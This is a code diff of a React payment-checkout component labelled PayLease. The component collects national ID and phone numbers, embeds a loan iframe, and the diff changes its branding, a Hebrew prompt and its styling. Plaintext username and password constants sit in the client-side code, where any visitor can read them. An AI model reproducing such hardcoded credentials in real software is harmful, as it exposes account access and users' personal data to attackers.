@@ -1,13 +1,14 @@
 import React, { useState } from 'react';
 
 // Constants for authentication
-const AUTH_USERNAME = "epilady";
-const AUTH_PASSWORD = "jj&h3juhHauhsujs?hhw";
+const AUTH_USERNAME = "BDO";
+const AUTH_PASSWORD = "jj&h2juhHauhsujs?hhw";
 
-// Simple UUID generator function
+// Updated UUID generator function
 const generateUUID = () => {
   return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    const r = Math.random() * 16 | 0;
+    const v = c === 'x' ? r : (r & 0x3) | 0x8;
     return v.toString(16);
   });
 };
@@ -17,7 +18,7 @@ const PayLeaseCheckout = () => {
   const [description, setDescription] = useState('');
   const [socialId, setSocialId] = useState('');
   const [phoneNumber, setPhoneNumber] = useState('');
-  const [iframeUrl, setIframeUrl] = useState('/static-google-redirect.html');
+  const [iframeUrl, setIframeUrl] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
   const handlePhoneChange = (e) => {
@@ -79,10 +80,10 @@ const PayLeaseCheckout = () => {
       <div className="checkout-container">
         <div className="checkout-header">
           <div className="logo">
+            <span className="logo-text">PayLease - BDO</span>
             <div className="logo-circle">
               <span>P</span>
             </div>
-            <span className="logo-text">PayLease</span>
           </div>
         </div>
         <div className="checkout-content">
@@ -142,13 +143,19 @@ const PayLeaseCheckout = () => {
           </div>
           
           <div className="iframe-column">
-            <iframe
-              src={iframeUrl}
-              title="Loan Process"
-              className="loan-iframe"
-            >
-              Your browser does not support iframes.
-            </iframe>
+            {iframeUrl ? (
+              <iframe
+                src={iframeUrl}
+                title="Loan Process"
+                className="loan-iframe"
+              >
+                Your browser does not support iframes.
+              </iframe>
+            ) : (
+              <div className="pre-submit-message">
+                אנא לחץ על כפתור "בצע תשלום" כדי להמשיך
+              </div>
+            )}
           </div>
         </div>
       </div>
@@ -183,7 +190,7 @@ const PayLeaseCheckout = () => {
         .logo-text {
           font-size: 1.5rem;
           font-weight: bold;
-          margin-right: 0.5rem;
+          margin-left: 0.5rem;
         }
         .logo-circle {
           width: 2rem;
@@ -195,7 +202,6 @@ const PayLeaseCheckout = () => {
           align-items: center;
           color: white;
           font-weight: bold;
-          margin-right: 0.5rem;
         }
         .checkout-content {
           display: flex;
@@ -203,7 +209,7 @@ const PayLeaseCheckout = () => {
         }
         .form-column {
           flex: 1;
-          padding: 1rem;
+          padding: 1rem 1rem 1rem 2rem;
           border-left: 1px solid #e0e0e0;
         }
         .form-section {
@@ -216,6 +222,9 @@ const PayLeaseCheckout = () => {
         }
         .iframe-column {
           flex: 1;
+          display: flex;
+          justify-content: center;
+          align-items: center;
         }
         h2 {
           font-size: 1.2rem;
@@ -256,6 +265,11 @@ const PayLeaseCheckout = () => {
           width: 100%;
           height: 600px;
           border: none;
+        }
+        .pre-submit-message {
+          text-align: center;
+          font-size: 1.2rem;
+          color: #4b5563;
         }
       `}</style>
     </div>
